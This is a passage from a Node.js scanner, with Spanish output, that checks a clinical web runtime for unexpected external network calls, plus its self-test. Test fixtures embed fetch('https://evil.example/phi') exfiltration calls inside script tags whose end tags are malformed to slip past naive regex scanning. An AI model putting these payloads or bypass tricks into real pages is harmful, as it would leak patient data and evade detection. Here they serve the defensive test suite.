    // newline and attribute-like junk before `>`). Browsers/jsdom close the
    // raw-text element there, so the payload IS in a live script body and
    // must be flagged. The old SCRIPT_BLOCK_RE missed it (exit 0 bypass).
    assertCase("case-11-dist-html-endtag-tab-nl-junk", {
      "dist/index.html": `<!doctype html><html><body><script type="module">fetch("https://evil.example/phi");</script\t\n bar></body></html>\n`
    }, { rules: { "dist-fetch-call": 1 } });

    // 12. Uppercase end tag with attribute junk: `</SCRIPT foo="x">`.
    assertCase("case-12-dist-html-endtag-uppercase-attr", {
      "dist/index.html": `<!doctype html><html><body><script>fetch("https://evil.example/phi");</SCRIPT foo="x"></body></html>\n`
    }, { rules: { "dist-fetch-call": 1 } });

    // 13. Quote-aware end-tag tail: `</script bar="a>b">` — the first
    // UNQUOTED `>` is after the quoted attribute, so the payload before the
    // real end tag must still be scanned.
    assertCase("case-13-dist-html-endtag-quoted-attr", {
      "dist/index.html": `<!doctype html><html><body><script>fetch("https://evil.example/phi");</script bar="a>b"></body></html>\n`
    }, { rules: { "dist-fetch-call": 1 } });

    // 14. REGRESSION: a normal `</script>` document with NO network payload
    // must stay clean — the new scanner must not introduce false positives.
    assertCase("case-14-dist-html-normal-clean", {
      "dist/index.html": `<!doctype html><html><body><script>console.log("hello");</script></body></html>\n`
    }, { expectExit1: false });
  } finally {
    // Leave no temp dirs behind, even when a case throws.
    if (sandboxExists) {
      fs.rmSync(sandboxRoot, { recursive: true, force: true });
      sandboxExists = false;
    }
  }

  console.log("Self-test de check-external-resources.mjs:");
  let allPass = true;
  for (const result of results) {
    if (!result.pass) allPass = false;
    const status = result.pass ? "PASS" : "FAIL";
    console.log(`  [${status}] ${result.name}`);
    for (const detail of result.details) {
      console.log(`         ${detail}`);
    }
    if (!result.pass) {
      for (const violation of result.reportable) {
        console.log(`         -> ${violation.file}:${violation.line} ${violation.rule}: ${violation.snippet}`);
      }
    }
  }
  try {
    fs.accessSync(sandboxRoot);
    // If cleanup somehow did not run, report it: no temp residue allowed.
    allPass = false;
    console.log("  [FAIL] temp-residue: sandbox directory still exists after cleanup");
  } catch {
    console.log("  [PASS] temp-residue: sandbox eliminado, sin residuos");
  }

  if (!allPass) {
    console.error("SELF-TEST: FALLO (al menos un caso no se comporto como se esperaba)");
    return 1;
  }
  console.log("SELF-TEST: OK (todos los casos se comportaron como se esperaba)");
  return 0;
}

// ---------------------------------------------------------------------------
// Main run.
// ---------------------------------------------------------------------------
if (selfTest) {
  process.exit(runSelfTest());
}

const { violations, sourceFilesScanned, distFilesScanned, distPresent } = scanRoot(repoRoot, scope);

let distInfoLine;
if (scope === "source") {
  distInfoLine = "dist: omitido por --scope=source";
} else if (distPresent) {
  distInfoLine = `dist: ${distFilesScanned} archivos escaneados`;
} else {
  distInfoLine =
    "dist: no existe (se omite el escaneo de salida construida; en CI este check corre despues del build)";
}

const reportable = finalizeViolations(violations);

if (reportable.length > 0) {
  console.error("Violaciones de invariantes de red/privacidad del runtime clinico V4:");
  for (const violation of reportable) {
    console.error(
      "- " + violation.file + ":" + violation.line + " -> " + violation.rule + ": " + violation.snippet
    );
  }
  process.exit(1);
}

console.log(
  "OK: runtime clinico V4 sin recursos externos inesperados. " +
    "Fuente: " + sourceFilesScanned + " archivos escaneados (tokens: " + DENYLIST_TOKENS.length +
    ", patrones remotos: " + REMOTE_LOADING_PATTERNS.length + ", console.*: si), " +
    distInfoLine + ", reglas de red runtime en dist: " +
    (DIST_RUNTIME_NETWORK_PATTERNS.length + 1) + " (incluye fetch por call-site), " +
    "allowlist: " + ALLOWED_EXCEPTIONS.size + " excepciones autorizadas."
);
